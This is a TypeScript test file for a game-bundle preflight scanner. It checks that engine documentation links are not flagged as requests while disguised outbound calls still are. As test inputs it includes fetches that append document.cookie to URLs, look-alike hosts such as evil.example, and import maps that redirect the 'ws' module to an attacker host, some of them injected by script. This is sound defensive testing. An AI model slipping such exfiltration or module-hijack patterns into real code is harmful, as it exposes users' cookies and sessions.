import test from 'node:test';
import assert from 'node:assert/strict';
import { platformPreflight } from '../src/platform';
import type { PreflightFile } from '../src/index';

/* Three false positives the starter fleet found on 23 Oct 2026, each a blocker on a stock
   engine build, and for each the requests that must still be refused. The engine lines are
   copied from the starters' real builds: Excalibur 0.32.0, Babylon.js 9.31.2 and Pyodide
   0.27.7. */

const file = (path: string, content: string): PreflightFile => ({ path, size: Buffer.byteLength(content), text: async () => content });
const binary = (path: string): PreflightFile => ({ path, size: 8, text: async () => { throw new Error('binary'); } });
const modulePage = '<!doctype html><html><body><canvas id="game"></canvas><script type="module" src="./assets/index.js"></script></body></html>';
const game = (code: string) => platformPreflight([file('index.html', modulePage), file('assets/index.js', code)]);
const blockers = (result: { findings: { code: string; severity: string; title: string }[] }) =>
  result.findings.filter((f) => f.severity === 'blocker');
/* Since 2027-03 an ordinary https host is allowed, so a request to one is a line in the
   external-hosts note rather than a blocker. These cases are about whether a skip WRONGLY
   swallows a request, and a swallowed request is missing from the note as surely as it
   was missing from the blockers, so the note is what they read now. Exact host, from the
   note's list, because `www.w3.org` is a prefix of the look-alike host below. */
type Result = { findings: { code: string; severity: string; title: string; more?: string[] }[] };
const named = (result: Result, host: string) =>
  (result.findings.find((f) => f.code === 'external-hosts')?.more ?? []).some((row) => row.endsWith(`→ ${host}`));

const EXCALIBUR_SIGNATURE = 'const Wt={ExcaliburBlue:"#176BAA"};function addSystem(e){if(!e)throw new Error("Could not add entity/system")}\n';
const EXCALIBUR_LOADERS = 'for(const[s,n]of Object.entries(this.images)){if(!n.isLoaded()){t||this._logger.warnOnce(`Image named ${s} in not loaded, nothing will be uploaded to the shader. Did you forget to add this to a loader? https://excaliburjs.com/docs/loaders/`);continue}}\n'
  + 'getTotalPlaybackDuration(){return this.isLoaded()?this.data.duration:(this.logger.warnOnce(`Sound from ${this.path} is not loaded, cannot return total playback duration.Did you forget to add Sound to a loader? https://excaliburjs.com/docs/loaders/`),0)}\n';
const EXCALIBUR_TOAST = 'i&&this._toaster.toast("Excalibur is encountering performance issues. It\'s possible that your browser doesn\'t have hardware acceleration enabled. Visit [LINK] for more information and potential solutions.","https://excaliburjs.com/docs/performance"),this.useCanvas2DFallback();\n';
const EXCALIBUR = EXCALIBUR_SIGNATURE + EXCALIBUR_LOADERS + EXCALIBUR_TOAST;

test('Excalibur\'s own documentation links are not requests', async () => {
  const result = await game(EXCALIBUR);
  assert.equal(result.engine?.id, 'excalibur');
  assert.deepEqual(blockers(result), []);
  assert.equal(result.ok, true);
  const notes = result.findings.filter((f) => f.code === 'engine-default');
  assert.deepEqual(notes.map((f) => f.line), [4], 'the toast link is an engine default; the two loader questions are prose');
});

test('a URL after a question mark in code is still a request', async () => {
  for (const code of [
    'const u = ready ? "https://ko-fi.com/x" : null; fetch(u);',
    'fetch(ok?"https://ko-fi.com/x":"/local");',
    'fetch(!0 ? `https://ko-fi.com/x` : "");',
    /* The space before the URL is a newline, which a sentence in a string cannot hold
       unescaped, so the quote still decides. `fetch("Ready? https://x")` itself is
       deliberately read as prose: it requests a relative path, never x. */
    'fetch(ready?\n"https://ko-fi.com/x":0);',
  ]) {
    assert.ok(blockers(await game(code)).some((f) => f.code === 'blocked-service' && f.title.includes('ko-fi.com')), code);
  }
});

test('the Excalibur toast row holds only at the engine\'s own line, and only for Excalibur', async () => {
  /* Without Excalibur detected, the same line is an ordinary request. */
  const bare = await game(EXCALIBUR_TOAST);
  assert.ok(named(bare, 'excaliburjs.com'));
  assert.equal(named(await game(EXCALIBUR), 'excaliburjs.com'), false, 'the real lines alone name nothing, or the cases below prove nothing');
  for (const extra of [
    'fetch("https://excaliburjs.com/docs/performance");',
    'this._toaster.toast("Visit [LINK] for more information and potential solutions.","https://excaliburjs.com/docs/performance"+document.cookie);',
    'this._toaster.toast("Visit [LINK] for more information and potential solutions.","https://excaliburjs.com/docs/performance/../collect");',
    'fetch("https://excaliburjs.com/docs/performance", { method: "POST" });',
  ]) {
    const result = await game(EXCALIBUR + extra);
    assert.ok(named(result, 'excaliburjs.com'), extra);
  }
});

const BABYLON_VR_BUTTON = 'const css="background-image: url("+(window.SVGSVGElement?"data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20width%3D%222048%22%3E%3C/svg%3E%0A":"/local/vrButton.png")+");";';

test('the SVG namespace inside a percent-encoded data URI is not a request', async () => {
  const result = await game(BABYLON_VR_BUTTON);
  assert.deepEqual(result.findings.filter((f) => f.code === 'outbound-origin'), []);
  assert.equal(result.ok, true);
});

test('a protocol-relative w3.org fetch, or a look-alike host, is still a request', async () => {
  for (const [code, host] of [
    ['fetch("//www.w3.org/collect?" + document.cookie);', 'www.w3.org'],
    ['fetch("//www.w3.org.evil.example/x");', 'www.w3.org.evil.example'],
    ['fetch("http%3A//www.w3.org.evil.example/x");', 'www.w3.org.evil.example'],
    ['fetch("http%3A//evil.example/2000/svg");', 'evil.example'],
    ['fetch("%3A//www.w3.org/x");', 'www.w3.org'],
  ] as const) {
    assert.ok(named(await game(code), host), code);
  }
});

/* Pyodide 0.27.7's classic loader, cut to the lines that matter, beside the files its
   distribution carries. The page is the Python starter's own shell. */
const PYODIDE_LOADER = 'var loadPyodide=async function(){};const asm="pyodide.asm.wasm";\n'
  + 'async function M(){if(!y)return;let e=J,t=await import(/* webpackIgnore */"node:crypto"),i=await import(/* webpackIgnore */"ws"),r=await import(/* webpackIgnore */"node:child_process"),a={fs:e,crypto:t,ws:i,child_process:r};globalThis.require=a}\n'
  + 'async function boot(n,d){return n.sys.path.insert(0,""),d.version.includes("dev")||n.setCdnUrl(`https://cdn.jsdelivr.net/pyodide/v${d.version}/full/`),n._pyodide.set_excepthook()}\n';
const pyodidePage = '<!doctype html><html><body><canvas width="640" height="440"></canvas><script src="./runtime/pyodide.js"></script><script type="module">const py=await loadPyodide({indexURL:"./runtime/"});</script></body></html>';
const pyodide = (loader: string, extra: PreflightFile[] = []) => platformPreflight([
  file('index.html', pyodidePage), file('runtime/pyodide.js', loader), binary('runtime/pyodide.asm.wasm'), ...extra]);

/* NO PYODIDE EXCEPTION FOR `ws`, AND ONE WAS TRIED. Pyodide's loader imports `ws` only
   under Node, and an earlier commit on this branch made that statement a note when Pyodide
   was detected and no import map answered for `ws`. A review then cleared it four ways the
   check could not see: an upper-case `type="IMPORTMAP"`, a second map, a sibling page with
   no map whose note hid the mapped page's blocker, and a map written by an inline script.
   Chrome honours three of those, and the fourth cannot be closed by reading the files.
   The exception bought nothing either, because jsDelivr and python_stdlib.zip still fail
   every Pyodide distribution, so it was removed rather than patched. These are the
   review's four proofs, and each must stay a blocker. */
test('Pyodide\'s own ws import is a bare import, with Pyodide detected', async () => {
  const result = await pyodide(PYODIDE_LOADER);
  assert.equal(result.engine?.id, 'pyodide');
  assert.deepEqual(blockers(result).map((f) => f.code).sort(), ['bare-import']);
  assert.equal(result.findings.find((f) => f.code === 'engine-cdn-runtime')?.severity, 'warning');
  assert.equal(result.findings.some((f) => f.code === 'engine-default'), false);
});

/* Engine detection is two strings anybody can write, so every case below forges it. */
const FORGED = 'var loadPyodide=1;const asm="pyodide.asm.wasm";';
const NODE_BRANCH = 'let t=await import("node:crypto"),i=await import("ws"),r=await import("node:child_process");i.default();';
/* Plain http since 26 Oct 2026: an https target is a CDN import the open contract allows,
   so it would map `ws` to something legitimate and pin nothing. What these cases ask is
   whether the walk sees the map at all, and an http target answers that the same way. */
const EVIL_MAP = '{"imports":{"node:crypto":"./stub.js","ws":"http:\\/\\/evil.example/x.js","node:child_process":"./stub.js"}}';
const ENTRY = '<script type="module" src="./main.js"></script>';
const forged = (pages: PreflightFile[]) => platformPreflight([...pages, file('main.js', FORGED + NODE_BRANCH), file('stub.js', 'export default 1;')]);
const wsBlocks = (result: Awaited<ReturnType<typeof forged>>, label: string) => {
  assert.equal(result.engine?.id, 'pyodide', `${label}: the forged signature is what makes this case worth having`);
  assert.equal(result.ok, false, label);
  assert.ok(blockers(result).some((f) => f.code === 'bare-import' && f.title.includes('imports ws')), label);
  assert.equal(result.findings.some((f) => f.code === 'engine-default'), false, label);
};

test('a ws import mapped to another host blocks', async () => {
  wsBlocks(await forged([file('index.html', `<!doctype html><script type="importmap">${EVIL_MAP}</script>${ENTRY}`)]), 'lower-case map');
});

test('P1: a ws import mapped by an upper-case IMPORTMAP blocks', async () => {
  wsBlocks(await forged([file('index.html', `<!doctype html><script type="IMPORTMAP">${EVIL_MAP}</script>${ENTRY}`)]), 'IMPORTMAP');
});

test('P2: a ws import mapped by a second import map blocks', async () => {
  wsBlocks(await forged([file('index.html', `<!doctype html><script type="importmap">{"imports":{"x":"./stub.js"}}</script><script type="importmap">${EVIL_MAP}</script>${ENTRY}`)]), 'second map');
});

test('P3: a sibling page without a map does not hide the mapped page\'s ws import', async () => {
  wsBlocks(await forged([file('a.html', `<!doctype html>${ENTRY}`), file('index.html', `<!doctype html><script type="importmap">${EVIL_MAP}</script>${ENTRY}`)]), 'sibling page');
});

test('P4: a ws import mapped by an import map an inline script writes blocks', async () => {
  const inject = `<script>var s=document.createElement("script");s.type="importmap";s.textContent=${JSON.stringify(EVIL_MAP)};document.head.append(s)</script>`;
  wsBlocks(await forged([file('index.html', `<!doctype html>${inject}${ENTRY}`)]), 'injected map');
});

/* The row that excused Pyodide's setCdnUrl line matched template text, so the URL was
   whatever `d.version` held. This is the review's proof, which passed as a note. */
test('a jsDelivr URL built from a template on Pyodide\'s line is still read as a CDN runtime', async () => {
  const code = FORGED + 'const n={setCdnUrl:u=>import(u+"x.js")},d={version:"/../../npm/evil@1/"};'
    + 'd.version.includes("dev")||n.setCdnUrl(`https://cdn.jsdelivr.net/pyodide/v${d.version}/full/`);';
  const result = await game(code);
  assert.equal(result.engine?.id, 'pyodide');
  assert.ok(result.findings.some((f) => f.code === 'engine-cdn-runtime' && f.severity === 'warning' && f.title.includes('cdn.jsdelivr.net')));
  assert.equal(result.findings.some((f) => f.code === 'engine-default'), false);
});

/* python_stdlib.zip is NOT excused, and that is deliberate. The archive stage
   (apps/pipeline/opengame_pipeline/names.py) refuses a nested .zip that no engine reader
   is configured for, and limits.json's runtimeSourcePublication note records that
   Pyodide's nested archive coverage is incomplete. Excusing it here would make
   `opengame check` pass a bundle the server then refuses. */
test('a stdlib zip is a nested archive with Pyodide detected or without it', async () => {
  const withPyodide = await pyodide(PYODIDE_LOADER, [binary('runtime/python_stdlib.zip')]);
  assert.equal(withPyodide.engine?.id, 'pyodide');
  assert.ok(blockers(withPyodide).some((f) => f.code === 'nested-archive' && f.title.startsWith('runtime/python_stdlib.zip')));
  const without = await game('console.log(1)');
  assert.equal(without.ok, true);
  const plain = await platformPreflight([file('index.html', modulePage), file('assets/index.js', 'console.log(1)'), binary('python_stdlib.zip')]);
  assert.ok(blockers(plain).some((f) => f.code === 'nested-archive'));
});

/* A row on a host makes the table the judge of every value there (ENGINE_DEFAULT_HOSTS),
   so the jsDelivr row this branch tried and dropped also turned this credits list, which
   has nothing to do with Pyodide, from a warning into a blocker. Pinned so a later row on
   a shared CDN has to answer for it. */
test('a jsDelivr URL in a data value is named, and neither refused nor read as a runtime', async () => {
  const result = await game('const credits={src:"https://cdn.jsdelivr.net/npm/foo@1/x.js"};console.log(credits);');
  assert.deepEqual(result.findings.filter((f) => f.code === 'outbound-origin' || f.code === 'engine-cdn-runtime'), []);
  assert.ok(named(result, 'cdn.jsdelivr.net'));
  assert.equal(result.ok, true);
});

test('an engine whose name starts with a vowel is "an" engine', async () => {
  const note = (await game(EXCALIBUR)).findings.find((f) => f.code === 'engine-default');
  assert.match(note?.title ?? '', /, an Excalibur default\.$/);
});
